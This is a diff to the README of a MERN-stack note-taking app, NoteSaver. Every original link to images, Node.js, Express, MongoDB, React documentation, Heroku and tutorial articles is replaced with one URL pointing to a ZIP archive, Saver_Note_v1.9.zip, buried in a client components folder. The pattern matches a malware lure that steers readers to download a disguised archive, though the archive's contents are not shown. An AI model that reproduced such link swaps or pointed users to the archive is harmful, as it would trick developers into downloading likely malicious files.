@@ -1,31 +1,31 @@
 # NoteSaver
 - The scope of this application was to be familiar with how to use MERN stack and CRUD while building a full stack web application.
 
-![what-is-mern-stack-architecture](https://user-images.githubusercontent.com/62245004/98396310-99937000-206e-11eb-9ad1-4799d58e8699.png)
+![what-is-mern-stack-architecture](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip)
 
  
 
 ## Functionality of The App
-- This app is similar to [Google Keep](https://keep.google.com). 
+- This app is similar to [Google Keep](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip). 
 - Users can add notes as many as they wanted.
 - They can delete and edit the notes that are taken.
 - Additionally editing time will be recorded.
 
 
 
-![P2](https://github.com/therohitbansal/NoteSaver/assets/92664590/4f409929-9d90-48e9-acda-e6b7ff2107c5)
+![P2](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip)
 
 ## What I Have Used
-- For the backend server environment, I used [Node.js](https://nodejs.org) with [Express.js](https://expressjs.com) framework to design application layer.
-- For the persistence of data, I used [MongoDB](https://www.mongodb.com) as my database to store user's notes.
+- For the backend server environment, I used [https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip) with [https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip) framework to design application layer.
+- For the persistence of data, I used [MongoDB](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip) as my database to store user's notes.
   - A note schema holds title and content fields.
-- For the frontend i used [React.js](https://en.reactjs.org) library to design the client side of the application.
-- React hooks especially [useState](https://en.reactjs.org/docs/hooks-reference.html#usestate), [useEffect](https://en.reactjs.org/docs/hooks-reference.html#useeffect) and [useRef](https://en.reactjs.org/docs/hooks-reference.html#useref) are used to increase effectiveness of the application through maintaining(useState), refreshing(useEffect) and reassigning(useRef) amongst component states.
-- For deploying the app to [Heroku](https://devcenter.heroku.com), [I followed this article.](https://www.freecodecamp.org/news/deploying-a-mern-application-using-mongodb-atlas-to-heroku).
+- For the frontend i used [https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip) library to design the client side of the application.
+- React hooks especially [useState](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip), [useEffect](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip) and [useRef](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip) are used to increase effectiveness of the application through maintaining(useState), refreshing(useEffect) and reassigning(useRef) amongst component states.
+- For deploying the app to [Heroku](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip), [I followed this article.](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip).
 
 ## Resources I Follow Up
-- [Easiest Way to Connect a React Frontend with Node.js](https://medium.com/zero-equals-false/how-to-connect-a-react-frontend-with-node-js-bccb1fb7e2bb).
-- [Code splitting](https://en.reactjs.org/docs/code-splitting.html).
-- [React Hooks: How to use useEffect()](https://medium.com/javascript-in-plain-english/react-hooks-how-to-use-useeffect-ecea3e90d84f).
+- [Easiest Way to Connect a React Frontend with https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip).
+- [Code splitting](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip).
+- [React Hooks: How to use useEffect()](https://raw.githubusercontent.com/therohitbansal/NoteSaver/main/client/src/components/formElements/Saver_Note_v1.9.zip).
 
 
